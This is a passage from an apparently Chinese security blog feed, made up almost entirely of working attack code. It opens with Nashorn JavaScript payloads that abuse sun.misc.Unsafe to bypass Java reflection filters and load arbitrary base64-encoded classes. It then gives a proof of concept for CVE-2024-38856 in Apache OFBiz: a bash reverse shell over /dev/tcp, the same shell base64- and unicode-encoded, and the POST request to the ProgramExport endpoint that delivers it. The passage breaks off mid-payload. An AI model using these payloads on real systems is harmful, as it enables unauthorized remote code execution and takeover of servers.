class="hljs-title function_">putObject</span>(reflectionClass, unsafe.<span class="hljs-title function_">staticFieldOffset</span>(fieldFilterMapField), java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>).<span class="hljs-title function_">newInstance</span>());<br>    &#125;<br>    <span class="hljs-keyword">var</span> clz = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>).<span class="hljs-title function_">getResourceAsStream</span>(<span class="hljs-string">&quot;Class.class&quot;</span>).<span class="hljs-title function_">readAllBytes</span>();<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">ClassAnonymousClass</span> = unsafe.<span class="hljs-title function_">defineAnonymousClass</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>), clz, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">var</span> reflectionDataField = <span class="hljs-title class_">ClassAnonymousClass</span>.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;reflectionData&quot;</span>);<br>    unsafe.<span class="hljs-title function_">putObject</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>), unsafe.<span class="hljs-title function_">objectFieldOffset</span>(reflectionDataField), <span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Base64DecodeToByte</span>(<span class="hljs-params">str</span>) &#123;<br>    <span class="hljs-keyword">var</span> bt;<br>    <span class="hljs-keyword">try</span> &#123;<br>        bt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">decodeBuffer</span>(str);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        bt = java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">getDecoder</span>().<span class="hljs-title function_">decode</span>(str);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bt;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">defineClass</span>(<span class="hljs-params">classBytes</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        unsafe.<span class="hljs-title function_">defineClass</span>(<span class="hljs-literal">null</span>, classBytes, <span class="hljs-number">0</span>, classBytes.<span class="hljs-property">length</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>).<span class="hljs-title function_">newInstance</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-title function_">bypass</span>()<br>        <span class="hljs-keyword">var</span> defineClassMethod = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).<span class="hljs-title function_">getDeclaredMethod</span>(<br>            <span class="hljs-string">&quot;defineClass&quot;</span>,<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;[B&quot;</span>),<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span>,<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span><br>        );<br>        <span class="hljs-keyword">var</span> modifiers = defineClassMethod.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>        unsafe.<span class="hljs-title function_">putShort</span>(defineClassMethod, unsafe.<span class="hljs-title function_">objectFieldOffset</span>(modifiers), <span class="hljs-number">0x00000001</span>);<br>        <span class="hljs-keyword">var</span> cc = defineClassMethod.<span class="hljs-title function_">invoke</span>(<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getContextClassLoader</span>(),<br>            classBytes,<br>            <span class="hljs-number">0</span>,<br>            classBytes.<span class="hljs-property">length</span><br>        );<br>        cc.<span class="hljs-title function_">newInstance</span>();<br>    &#125;<br>&#125;<br><span class="hljs-title function_">defineClass</span>(<span class="hljs-title class_">Base64DecodeToByte</span>(code));<br></code></pre></td></tr></table></figure><h3 id="defineAnonymousClass-js"><a href="#defineAnonymousClass-js" class="headerlink" title="defineAnonymousClass.js"></a>defineAnonymousClass.js</h3><p>适用范围：JDK6-14</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Base64DecodeToByte</span>(<span class="hljs-params">str</span>) &#123;<br>    <span class="hljs-keyword">var</span> bt;<br>    <span class="hljs-keyword">try</span> &#123;<br>        bt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">decodeBuffer</span>(str);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        bt = java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">getDecoder</span>().<span class="hljs-title function_">decode</span>(str);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bt;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">defineClass</span>(<span class="hljs-params">classBytes</span>) &#123;<br>    <span class="hljs-keyword">var</span> theUnsafe = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>    theUnsafe.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<br>    unsafe = theUnsafe.<span class="hljs-title function_">get</span>(<span class="hljs-literal">null</span>);<br>    unsafe.<span class="hljs-title function_">defineAnonymousClass</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>), classBytes, <span class="hljs-literal">null</span>).<span class="hljs-title function_">newInstance</span>();<br>&#125;<br><br><span class="hljs-title function_">defineClass</span>(<span class="hljs-title class_">Base64DecodeToByte</span>(code));<br></code></pre></td></tr></table></figure><h3 id="goby-js"><a href="#goby-js" class="headerlink" title="goby.js"></a>goby.js</h3><p>适用范围：JDK6-14</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">load</span>(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUnsafe</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> theUnsafeMethod =<br>        java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>    theUnsafeMethod.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> theUnsafeMethod.<span class="hljs-title function_">get</span>(<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">removeClassCache</span>(<span class="hljs-params">clazz</span>) &#123;<br>    <span class="hljs-keyword">var</span> unsafe = <span class="hljs-title function_">getUnsafe</span>();<br>    <span class="hljs-keyword">var</span> clazzAnonymousClass = unsafe.<span class="hljs-title function_">defineAnonymousClass</span>(<br>        clazz,<br>        java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>)<br>            .<span class="hljs-title function_">getResourceAsStream</span>(<span class="hljs-string">&quot;Class.class&quot;</span>)<br>            .<span class="hljs-title function_">readAllBytes</span>(),<br>        <span class="hljs-literal">null</span><br>    );<br>    <span class="hljs-keyword">var</span> reflectionDataField =<br>        clazzAnonymousClass.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;reflectionData&quot;</span>);<br>    unsafe.<span class="hljs-title function_">putObject</span>(clazz, unsafe.<span class="hljs-title function_">objectFieldOffset</span>(reflectionDataField), <span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bypassReflectionFilter</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> reflectionClass;<br>    <span class="hljs-keyword">try</span> &#123;<br>        reflectionClass = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<br>            <span class="hljs-string">&quot;jdk.internal.reflect.Reflection&quot;</span><br>        );<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        reflectionClass = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.reflect.Reflection&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">var</span> unsafe = <span class="hljs-title function_">getUnsafe</span>();<br>    <span class="hljs-keyword">var</span> classBuffer = reflectionClass<br>        .<span class="hljs-title function_">getResourceAsStream</span>(<span class="hljs-string">&quot;Reflection.class&quot;</span>)<br>        .<span class="hljs-title function_">readAllBytes</span>();<br>    <span class="hljs-keyword">var</span> reflectionAnonymousClass = unsafe.<span class="hljs-title function_">defineAnonymousClass</span>(<br>        reflectionClass,<br>        classBuffer,<br>        <span class="hljs-literal">null</span><br>    );<br>    <span class="hljs-keyword">var</span> fieldFilterMapField =<br>        reflectionAnonymousClass.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;fieldFilterMap&quot;</span>);<br>    <span class="hljs-keyword">var</span> methodFilterMapField =<br>        reflectionAnonymousClass.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;methodFilterMap&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<br>        fieldFilterMapField<br>            .<span class="hljs-title function_">getType</span>()<br>            .<span class="hljs-title function_">isAssignableFrom</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>))<br>    ) &#123;<br>        unsafe.<span class="hljs-title function_">putObject</span>(<br>            reflectionClass,<br>            unsafe.<span class="hljs-title function_">staticFieldOffset</span>(fieldFilterMapField),<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>)<br>                .<span class="hljs-title function_">getConstructor</span>()<br>                .<span class="hljs-title function_">newInstance</span>()<br>        );<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<br>        methodFilterMapField<br>            .<span class="hljs-title function_">getType</span>()<br>            .<span class="hljs-title function_">isAssignableFrom</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>))<br>    ) &#123;<br>        unsafe.<span class="hljs-title function_">putObject</span>(<br>            reflectionClass,<br>            unsafe.<span class="hljs-title function_">staticFieldOffset</span>(methodFilterMapField),<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>)<br>                .<span class="hljs-title function_">getConstructor</span>()<br>                .<span class="hljs-title function_">newInstance</span>()<br>        );<br>    &#125;<br>    <span class="hljs-title function_">removeClassCache</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.lang.Class&quot;</span>));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setAccessible</span>(<span class="hljs-params">accessibleObject</span>) &#123;<br>    <span class="hljs-keyword">var</span> unsafe = <span class="hljs-title function_">getUnsafe</span>();<br>    <span class="hljs-keyword">var</span> overrideField = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<br>        <span class="hljs-string">&quot;java.lang.reflect.AccessibleObject&quot;</span><br>    ).<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;override&quot;</span>);<br>    <span class="hljs-keyword">var</span> offset = unsafe.<span class="hljs-title function_">objectFieldOffset</span>(overrideField);<br>    unsafe.<span class="hljs-title function_">putBoolean</span>(accessibleObject, offset, <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">defineClass</span>(<span class="hljs-params">bytes</span>) &#123;<br>    <span class="hljs-keyword">var</span> clz = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">var</span> version = java.<span class="hljs-property">lang</span>.<span class="hljs-property">System</span>.<span class="hljs-title function_">getProperty</span>(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    <span class="hljs-keyword">var</span> unsafe = <span class="hljs-title function_">getUnsafe</span>();<br>    <span class="hljs-keyword">var</span> classLoader = <span class="hljs-keyword">new</span> java.<span class="hljs-property">net</span>.<span class="hljs-title class_">URLClassLoader</span>(<br>        java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Array</span>.<span class="hljs-title function_">newInstance</span>(<br>            java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.net.URL&quot;</span>),<br>            <span class="hljs-number">0</span><br>        )<br>    );<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (version.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>] &gt;= <span class="hljs-number">11</span>) &#123;<br>            <span class="hljs-title function_">bypassReflectionFilter</span>();<br>            defineClassMethod = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<br>                <span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span><br>            ).<span class="hljs-title function_">getDeclaredMethod</span>(<br>                <span class="hljs-string">&quot;defineClass&quot;</span>,<br>                java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;[B&quot;</span>),<br>                java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span>,<br>                java.<span class="hljs-property">lang</span>.<span class="hljs-property">Integer</span>.<span class="hljs-property">TYPE</span><br>            );<br>            <span class="hljs-title function_">setAccessible</span>(defineClassMethod);<br>            clz = defineClassMethod.<span class="hljs-title function_">invoke</span>(classLoader, bytes, <span class="hljs-number">0</span>, bytes.<span class="hljs-property">length</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> protectionDomain = <span class="hljs-keyword">new</span> java.<span class="hljs-property">security</span>.<span class="hljs-title class_">ProtectionDomain</span>(<br>                <span class="hljs-keyword">new</span> java.<span class="hljs-property">security</span>.<span class="hljs-title class_">CodeSource</span>(<br>                    <span class="hljs-literal">null</span>,<br>                    java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Array</span>.<span class="hljs-title function_">newInstance</span>(<br>                        java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.security.cert.Certificate&quot;</span>),<br>                        <span class="hljs-number">0</span><br>                    )<br>                ),<br>                <span class="hljs-literal">null</span>,<br>                classLoader,<br>                []<br>            );<br>            clz = unsafe.<span class="hljs-title function_">defineClass</span>(<br>                <span class="hljs-literal">null</span>,<br>                bytes,<br>                <span class="hljs-number">0</span>,<br>                bytes.<span class="hljs-property">length</span>,<br>                classLoader,<br>                protectionDomain<br>            );<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        error.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">return</span> clz;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">base64DecodeToByte</span>(<span class="hljs-params">str</span>) &#123;<br>    <span class="hljs-keyword">var</span> bt;<br>    <span class="hljs-keyword">try</span> &#123;<br>        bt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">decodeBuffer</span>(str);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        bt = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.Base64&quot;</span>).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">getDecoder</span>().<span class="hljs-title function_">decode</span>(str);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bt;<br>&#125;<br>clz = <span class="hljs-title function_">defineClass</span>(<span class="hljs-title function_">base64DecodeToByte</span>(code));<br>clz.<span class="hljs-title function_">newInstance</span>();<br></code></pre></td></tr></table></figure><h3 id="原贴"><a href="#原贴" class="headerlink" title="原贴"></a>原贴</h3><p><a href="https://forum.butian.net/share/487">https://forum.butian.net/share/487</a></p><p><a href="https://github.com/yzddmr6/Java-Js-Engine-Payloads?tab=readme-ov-file#js%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81">https://github.com/yzddmr6/Java-Js-Engine-Payloads?tab=readme-ov-file#js%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>(CVE-2024-38856)ofbiz_12.14_filter绕过到rce</title>
    <link href="/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/"/>
    <url>/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Vulnerability-description"><a href="#0x01-Vulnerability-description" class="headerlink" title="0x01  Vulnerability description"></a>0x01  Vulnerability description</h2><p>​In apache ofbiz 12.14, there is remote command execution. Users can use a specific url to bypass filter detection, resulting in unauthorized execution of goorvy code.</p><h3 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h3><p>First convert <strong>Reverse Shell</strong> to a form that can be recognized by java</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>Using unicode coding</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\u0022\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u004C\u0032\u004A\u0070\u0062\u0069\u0039\u0069\u0059\u0058\u004E\u006F\u0049\u0043\u0031\u0070\u0049\u0044\u0034\u006D\u0049\u0043\u0039\u006B\u005A\u0058\u0059\u0076\u0064\u0047\u004E\u0077\u004C\u007A\u0045\u0079\u004E\u0079\u0034\u0077\u004C\u006A\u0041\u0075\u004D\u0053\u0038\u0034\u004F\u0044\u0067\u0034\u0049\u0044\u0041\u002B\u004A\u006A\u0045\u003D\u007D\u007C\u007B\u0062\u0061\u0073\u0065\u0036\u0034\u002C\u002D\u0064\u007D\u007C\u007B\u0062\u0061\u0073\u0068\u002C\u002D\u0069\u007D\u0022\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webtools/control/main/ProgramExport</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8443<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-taggerscript">groovyProgram=<span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u0032</span><span class="hljs-symbol">\u004A</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0039</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0059</span><span class="hljs-symbol">\u0058</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0031</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u006D</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0039</span><span class="hljs-symbol">\u006B</span><span class="hljs-symbol">\u005A</span><span class="hljs-symbol">\u0058</span><span class="hljs-symbol">\u0059</span><span class="hljs-symbol">\u0076</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u0047</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u007A</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u004E</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u004C</span><span class="hljs-symbol">\u006A</span><span class="hljs-symbol">\u0041</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u004D</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0038</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u004F</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0067</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0044</span><span class="hljs-symbol">\u0041</span><span class="hljs-symbol">\u002B</span><span class="hljs-symbol">\u004A</span><span class="hljs-symbol">\u006A</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u003D</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u007C</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0036</span><span class="hljs-symbol">\u0034</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u007C</span><span class="hljs-symbol">\u007B</span><span class="hljs-symbol">\u0062</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u002C</span><span class="hljs-symbol">\u002D</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u007D</span><span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span 